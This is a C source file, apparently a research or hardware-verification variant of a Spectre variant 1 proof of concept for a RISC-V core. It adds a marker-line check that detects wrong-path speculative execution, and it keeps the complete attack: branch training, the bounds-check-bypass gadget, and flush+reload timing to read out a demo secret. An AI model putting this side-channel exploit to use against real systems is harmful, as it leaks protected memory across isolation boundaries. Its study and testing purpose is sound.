#include <klib.h> // [1]
#include "encoding.h"
#include "cache-utils.h"

/* =============================================================================
 * spectre-v1-specpath.c
 *
 * 这是 spectre-v1.c 的副本(不改动原文件)。目的【只有一个】:检测 victim 是否
 * 真的推测执行了"错误路径"—— 即攻击时 idx 越界、if(idx<array1_sz) 被分支预测器
 * 误预测为 taken、进而【推测执行】了 if 体。不追求攻击成功、不恢复 secret。
 *
 * 检测原理(与 secret 完全无关):
 *   - 引入一条固定探测行 array2[SPEC_MARKER_LINE](SPEC_MARKER_LINE 与训练值 1..16、
 *     候选字符、secret 行都不重叠);
 *   - if 体内除原 gadget 外,额外推测访问这条 marker;
 *   - 每次调用 if 【前】flush marker(保证 marker 的"热"只可能来自这一次 if 体的执行);
 *   - if 【后】用架构态、一定执行的一条访存测 marker 的时延。
 *   - 攻击调用(idx>=VICTIM_ARCH_BOUND):架构上 if 体绝不执行 → marker 本不该被载入。
 *     若这时测到 marker 是热的(vdiff<g_threshold),唯一来源就是 if 体被【推测执行】
 *     → 证明 victim 走了错误路径。
 *   训练调用(idx 合法):if 体架构执行,marker 也会热,但那是正确路径,不作为判据
 *     (只统计/打印 idx>=VICTIM_ARCH_BOUND 的攻击调用)。
 *
 * 这条判据不涉及 array1[idx] 越界读、不解读 secret 字节值 —— 纯粹是"错误路径执行了吗"。
 * 原 gadget `array2[array1[idx]*64]` 保留不动(它推测读 secret 行,但本副本不测它)。
 *
 * threshold 原只在 main 可见,这里加全局 g_threshold,main 校准后赋值供 victim 用。
 *
 * 用法:建 tune profile 时用本文件【替换】 source/src/spectre-v1.c(勿与原文件并存
 *       编译);改 source 后按 §7.5 重算 SOURCE_TREE_SHA256。
 * ========================================================================== */

#ifndef TRAIN_TIMES
#define TRAIN_TIMES 6 // BOOM Spectre-v1 PoC uses six training iterations.
#endif
#ifndef ROUNDS
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#endif
#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#endif
#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif
#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif
#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif
#ifndef FLUSH_LINES
#define FLUSH_LINES 256
#endif
#ifndef FLUSH_CANDIDATE_LINES_ONLY
#define FLUSH_CANDIDATE_LINES_ONLY 0
#endif
#ifndef FLUSH_SINGLE_CANDIDATE_IDX
#define FLUSH_SINGLE_CANDIDATE_IDX -1
#endif
#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 62
#endif
#ifndef PROBE_MIX_STRIDE
#define PROBE_MIX_STRIDE 17
#endif
#ifndef PROBE_MIX_BIAS
#define PROBE_MIX_BIAS 13
#endif
#ifndef PRINT_TOP_N
#define PRINT_TOP_N 8
#endif

// 固定推测探测行(与训练 1..16 / 候选字符 / secret 行都不重叠)。< 256 即可。
#ifndef SPEC_MARKER_LINE
#define SPEC_MARKER_LINE 222
#endif
// idx >= 此值视为"攻击调用"(越界,架构上不进 if 体)。原始合法边界是 16。
#ifndef VICTIM_ARCH_BOUND
#define VICTIM_ARCH_BOUND 16
#endif
// 仅对攻击调用打印逐次命中(设 0 则训练调用也打印,通常会刷屏)。
#ifndef SPECPATH_PRINT_ATTACK_ONLY
#define SPECPATH_PRINT_ATTACK_ONLY 1
#endif

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t __attribute__((aligned(4096))) array2[256 * L1_BLOCK_SZ_BYTES];

char secretString[] = "S3CreT";

// main 校准后写入,victim 内 marker 时延判据用它。
uint64_t g_threshold = CACHE_HIT_THRESHOLD;
// 错误路径执行检测统计(victim 内架构态累加,main 每字节读增量)。
uint64_t volatile specpath_attack_calls = 0; // 攻击调用(idx>=bound)总次数
uint64_t volatile specpath_exec_hits    = 0; // 其中检测到 if 体被推测执行的次数

static inline uint64_t candidateValue(uint64_t idx){
    if (idx < 10) return '0' + idx;
    if (idx < 36) return 'A' + (idx - 10);
    return 'a' + (idx - 36);
}

static inline uint64_t mixedCandidateIdx(uint64_t idx){
    return (idx * PROBE_MIX_STRIDE + PROBE_MIX_BIAS) % PROBE_CANDIDATES;
}

static inline void flushProbeArray(void){
#if FLUSH_SINGLE_CANDIDATE_IDX >= 0
    uint64_t mixed_i = candidateValue(FLUSH_SINGLE_CANDIDATE_IDX);
    xs_flush_cache_line(&array2[mixed_i * L1_BLOCK_SZ_BYTES]);
#elif FLUSH_CANDIDATE_LINES_ONLY
    for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i){
        uint64_t mixed_i = candidateValue(mixedCandidateIdx(i));
        xs_flush_cache_line(&array2[mixed_i * L1_BLOCK_SZ_BYTES]);
    }
#else
    for (uint64_t i = 0; i < FLUSH_LINES; ++i){
        xs_flush_cache_line(&array2[i * L1_BLOCK_SZ_BYTES]);
    }
#endif
    xs_fence();
}

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

static void printTopCandidates(uint64_t* results, uint64_t expected){
    uint64_t topVal[PRINT_TOP_N];
    uint8_t topIdx[PRINT_TOP_N];
    uint64_t nonzero = 0;

    for (uint64_t i = 0; i < PRINT_TOP_N; ++i){
        topVal[i] = 0;
        topIdx[i] = 0;
    }

    for (uint64_t rankIdx = 0; rankIdx < PROBE_CANDIDATES; ++rankIdx){
        uint8_t candidate = candidateValue(rankIdx);
        uint64_t val = results[candidate];
        nonzero += val != 0;

        for (uint64_t pos = 0; pos < PRINT_TOP_N; ++pos){
            if (val > topVal[pos]){
                for (int64_t shift = PRINT_TOP_N - 1; shift > (int64_t)pos; --shift){
                    topVal[shift] = topVal[shift - 1];
                    topIdx[shift] = topIdx[shift - 1];
                }
                topVal[pos] = val;
                topIdx[pos] = candidate;
                break;
            }
        }
    }

    printf("debug nonzero=%lu expected_hits=%lu top%d:", nonzero, results[expected], PRINT_TOP_N);
    for (uint64_t i = 0; i < PRINT_TOP_N; ++i){
        printf(" (%lu,%c,%d)", topVal[i], topIdx[i], topIdx[i]);
    }
    printf("\n");
}

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 *
 * 【本副本改动】在 if 前 flush marker、if 体内加一条固定 marker 访存、if 后架构态测
 * marker 时延,用于检测 if 体是否被推测执行(错误路径),见文件头。原 gadget 未动。
 */
uint8_t victimFunc(uint64_t idx){
    uint8_t volatile dummy = 2;
    uint64_t vstart, vend, vdiff;

    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    // if 前:flush 固定 marker,保证它接下来的"热"只可能来自本次 if 体的(推测)执行。
    xs_flush_cache_line(&array2[SPEC_MARKER_LINE * L1_BLOCK_SZ_BYTES]);
    xs_fence();

    if (idx < array1_sz){
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];        // 原 gadget(未动)
        dummy &= array2[SPEC_MARKER_LINE * L1_BLOCK_SZ_BYTES];  // 新增:推测执行会载入固定 marker
    }

    // if 后:架构态、一定执行地测 marker 时延。热 => if 体被执行过。
    xs_fence();
    vstart = rdcycle();
    dummy &= array2[SPEC_MARKER_LINE * L1_BLOCK_SZ_BYTES];
    xs_fence();
    vend = rdcycle();
    vdiff = vend - vstart;

    // 攻击调用(idx 越界):架构上 if 体不执行;若 marker 热 => 一定是被推测执行的。
    if (idx >= VICTIM_ARCH_BOUND){
        specpath_attack_calls += 1;
        if (vdiff < g_threshold){
            specpath_exec_hits += 1;
            printf("[v1-specpath] SPEC-EXEC idx=%lu marker_line=%d vdiff=%lu (<%lu) => wrong path was speculatively executed\n",
                   idx, SPEC_MARKER_LINE, vdiff, g_threshold);
        } else {
#if !SPECPATH_PRINT_ATTACK_ONLY
            printf("[v1-specpath] no-exec idx=%lu marker_line=%d vdiff=%lu (>=%lu)\n",
                   idx, SPEC_MARKER_LINE, vdiff, g_threshold);
#endif
        }
    }

    // bound speculation here just in case it goes over
    dummy = rdcycle();
	return dummy; //Not used
}

int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
	uint64_t start, end, diff, passInIdx, randIdx;
    uint8_t volatile dummy = 0;
    static uint64_t results[256];
#if USE_FIXED_CACHE_HIT_THRESHOLD
    uint64_t measured_threshold = 0;
    uint64_t threshold = CACHE_HIT_THRESHOLD;
#else
    uint64_t measured_threshold = xs_calibrate_threshold(array2, L1_BLOCK_SZ_BYTES);
    uint64_t threshold = measured_threshold;
    if (threshold == 0) {
        threshold = CACHE_HIT_THRESHOLD;
    }
#endif
    g_threshold = threshold; // 供 victim 内 marker 判据使用

    printf("[v1] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
           CACHE_HIT_THRESHOLD, measured_threshold, threshold, USE_FIXED_CACHE_HIT_THRESHOLD);
    printf("[v1] reading %d bytes\n", SECRET_SZ);
    printf("[v1-specpath] wrong-path speculative-execution detector enabled (marker_line=%d, g_threshold=%lu)\n",
           SPEC_MARKER_LINE, g_threshold);

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // 本字节前记录检测统计快照
        uint64_t atk0 = specpath_attack_calls;
        uint64_t exe0 = specpath_exec_hits;

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
			//printf("attack round %d\n", atkRound);

#if USE_EVICTION_FLUSH
            // make sure array you read from is not in the cache by using DIY flushCache or CacheManagementOperations through flushCacheLine
            flushCache((uint64_t)array2, sizeof(array2));
#else
            flushProbeArray();
#endif
            xs_fence();

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = (atkRound * 7 + len * 3 + 1) % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 30; ++k){
                    asm("");
                }

                // call function to train or attack
                victimFunc(passInIdx);
            }

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i){
                uint64_t mixed_i = candidateValue(mixedCandidateIdx(i));
				xs_fence(); // fence to correctly read CSR register as can be executed OoO
                start = rdcycle();

                dummy &= array2[mixed_i * L1_BLOCK_SZ_BYTES];

				xs_fence();
				end = rdcycle();

                diff = end - start;
				//printf("diff %d\n", diff);
                if ( diff < threshold ){
                    results[mixed_i] += 1;
                }
            }
			//printf("diff %d, %lu\n", diff, start);
        }

        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] = want(%c) =?= guess(hits,char) 1.(%lu, %c) 2.(%lu, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], hitArray[1], output[1]);
        printf("debug expected_dec=%d guess1_dec=%d hits1=%lu guess2_dec=%d hits2=%lu expected_hits=%lu\n",
               (int)(uint8_t)secretString[len], (int)output[0], hitArray[0],
               (int)output[1], hitArray[1], results[(uint8_t)secretString[len]]);
        printTopCandidates(results, (uint8_t)secretString[len]);
        //printf("want(%c) =?= guess 1.(%c) 2.(%c)\n", secretString[len], output[0], output[1]);

        // ===== 错误路径执行检测汇总(本字节增量)=====
        // exec/attack:攻击调用里检测到 if 体被推测执行的比例。>0 即证明 victim 走了错误路径。
        {
            uint64_t datk = specpath_attack_calls - atk0;
            uint64_t dexe = specpath_exec_hits    - exe0;
            printf("[v1-specpath] byte %lu wrong-path spec-exec: %lu / %lu attack-calls (marker_line=%d threshold=%lu)\n",
                   len, dexe, datk, SPEC_MARKER_LINE, threshold);
        }

        // read in the next secret
        ++attackIdx;
    }

    return 0;
}
